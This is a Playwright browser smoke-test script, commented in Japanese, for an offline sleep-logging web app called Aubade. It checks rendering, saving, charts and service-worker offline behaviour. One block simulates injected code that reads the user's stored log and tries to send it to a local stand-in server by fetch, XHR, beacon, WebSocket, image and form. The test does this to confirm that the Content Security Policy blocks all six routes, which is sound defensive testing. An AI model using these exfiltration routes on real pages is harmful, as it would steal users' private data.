// 実ブラウザでしか確認できないことを見る。JSDOM は CSP を解釈せず、実描画も持たない。
// 使い方: npm run smoke
import http from "node:http";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { chromium } from "@playwright/test";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const PORT = 8899;
// Service Worker のスクリプトは JavaScript の MIME タイプで返さないとブラウザに拒否される
const TYPES = { ".html": "text/html; charset=utf-8", ".txt": "text/plain; charset=utf-8", ".js": "text/javascript; charset=utf-8" };

const results = [];
const check = (name, ok, detail) => {
  const d = detail == null ? "" : String(detail);
  results.push({ name, ok, detail: d.length > 160 ? d.slice(0, 160) + "…" : d });
};

const server = http.createServer((req, res) => {
  const path = req.url === "/" ? "/index.html" : req.url.split("?")[0];
  try {
    const body = readFileSync(join(ROOT, path));
    res.writeHead(200, { "Content-Type": TYPES[path.slice(path.lastIndexOf("."))] || "application/octet-stream" });
    res.end(body);
  } catch {
    res.writeHead(404);
    res.end("not found");
  }
});

// 記録を外部へ送ろうとする注入コードを演じ、実際に届いたリクエストだけを数える
const received = [];
const sink = http.createServer((req, res) => {
  received.push(req.method + " " + req.url);
  res.writeHead(200, { "Access-Control-Allow-Origin": "*" });
  res.end("ok");
});

await new Promise((r) => server.listen(PORT, "127.0.0.1", r));
await new Promise((r) => sink.listen(PORT + 1, "127.0.0.1", r));

const browser = await chromium.launch();
const context = await browser.newContext({ viewport: { width: 390, height: 844 } });
const page = await context.newPage();
const jsErrors = [];
page.on("pageerror", (e) => jsErrors.push(String(e.message)));
page.on("console", (m) => { if (m.type() === "error") jsErrors.push(m.text()); });

const base = `http://127.0.0.1:${PORT}/`;
await page.goto(base);

check("見出しが Aubade で描画される", (await page.textContent("h1")) === "Aubade");
check("記録タブが描画される", (await page.textContent("#view")).includes("就寝時刻"));

await page.getByRole("button", { name: "✓ した" }).first().click();
const saved = await page.evaluate(() => localStorage.getItem("flourish-log-v2"));
check("1タップで localStorage に保存される", !!saved && saved.includes("ashwagandha"));
check("「✓ 保存済み」が出る", (await page.textContent("#saveState")) === "✓ 保存済み");

await page.getByRole("button", { name: "〜6:30", exact: true }).click();
await page.getByRole("button", { name: "〜23:30", exact: true }).click();
const wake = await page.evaluate(() => JSON.parse(localStorage.getItem("flourish-log-v2")));
const wakeDay = wake.entries[Object.keys(wake.entries)[0]];
check("起床時刻が1タップで保存される", wakeDay.wake === 1, JSON.stringify(wakeDay));

for (const tab of ["週", "推移", "週報", "設定"]) {
  await page.getByRole("button", { name: tab, exact: true }).click();
  const len = (await page.textContent("#view")).length;
  check(`タブ「${tab}」が描画される`, len > 50, `${len}文字`);
}
await page.getByRole("button", { name: "推移", exact: true }).click();
check("推移タブにSVGが4枚以上ある", (await page.locator("svg").count()) >= 4);
check("推移タブに起床時刻チャートがある", (await page.textContent("#view")).includes("起床時刻(28日)"));
// 就寝と起床が1日ぶん揃ったので、睡眠の帯が塗られているはず
const band = await page.locator('path[fill-opacity], line[stroke-opacity]').count();
check("睡眠チャートに帯が描かれる", (await page.textContent("#view")).includes("睡眠(28日)") && band > 0, `帯の要素 ${band} 個`);

await page.getByRole("button", { name: "90日", exact: true }).click();
check("期間を90日に切り替えられる", (await page.textContent("#view")).includes("就寝時刻(90日)"));
await page.getByRole("button", { name: "28日", exact: true }).click();

const icon = await page.evaluate(async () => {
  const im = new Image();
  im.src = document.querySelector('link[rel="icon"]').href;
  try { await im.decode(); return true; } catch { return false; }
});
check("data: のアイコンが CSP に阻まれない", icon);

// この後の持ち出し試行では CSP 違反ログが出るのが正しいので、通常操作の分だけをここで見る
check("通常操作でJSエラーが出ない", jsErrors.length === 0, jsErrors.join(" / ") || "なし");

const violations = await page.evaluate(async (sinkUrl) => {
  const v = [];
  document.addEventListener("securitypolicyviolation", (e) => v.push(e.violatedDirective));
  const secret = localStorage.getItem("flourish-log-v2") || "x";
  try { await fetch(sinkUrl + "fetch?d=" + encodeURIComponent(secret)); } catch {}
  try { const x = new XMLHttpRequest(); x.open("POST", sinkUrl + "xhr"); x.send(secret); } catch {}
  try { navigator.sendBeacon(sinkUrl + "beacon", secret); } catch {}
  try { new WebSocket(sinkUrl.replace("http", "ws")); } catch {}
  new Image().src = sinkUrl + "img?d=" + encodeURIComponent(secret);
  const f = document.createElement("form");
  f.action = sinkUrl + "form"; f.method = "POST"; document.body.appendChild(f);
  try { f.submit(); } catch {}
  await new Promise((r) => setTimeout(r, 800));
  return v;
}, `http://127.0.0.1:${PORT + 1}/`);

check("持ち出しが CSP で遮断される", violations.length >= 5, `違反 ${violations.length} 件: ${[...new Set(violations)].join(", ")}`);
check("外部サーバーに1件も届かない", received.length === 0, received.join(" / ") || "0件");
check("ページ遷移が起きていない", page.url() === base, page.url());

// Service Worker はここでしか検証できない。JSDOM は実装を持たず、CSP の worker-src も解釈しない
const swState = await page.evaluate(async () => {
  if (!("serviceWorker" in navigator)) return "APIなし";
  // 登録が CSP で弾かれると ready は永久に解決しないので、待ち時間を切る
  const reg = await Promise.race([
    navigator.serviceWorker.ready,
    new Promise((r) => setTimeout(() => r(null), 5000)),
  ]);
  return reg && reg.active ? "active" : "登録されない";
});
check("Service Worker が登録され有効になる", swState === "active", swState);

await page.reload();
check("再読み込みで Service Worker の管理下に入る", await page.evaluate(() => !!navigator.serviceWorker.controller));

await context.setOffline(true);
let offline = "";
try {
  await page.reload({ timeout: 8000 });
  offline = (await page.textContent("h1")) === "Aubade" ? "開けた" : "開いたが描画されない";
} catch (e) { offline = "開けない: " + e.message; }
check("オフラインでも起動する", offline === "開けた", offline);
// 記録が消えていないこと。キャッシュから起動しても localStorage は同じ容器を見る
const kept = await page.evaluate(() => localStorage.getItem("flourish-log-v2"));
check("オフライン起動でも記録が残る", !!kept && JSON.parse(kept).entries && Object.keys(JSON.parse(kept).entries).length > 0);
await context.setOffline(false);

await browser.close();
server.close();
sink.close();

const pad = Math.max(...results.map((r) => r.name.length));
for (const r of results) {
  console.log(`${r.ok ? "PASS" : "FAIL"}  ${r.name.padEnd(pad)}${r.detail ? "  — " + r.detail : ""}`);
}
const failed = results.filter((r) => !r.ok);
console.log(`\n${results.length - failed.length}/${results.length} passed`);
if (failed.length) process.exit(1);
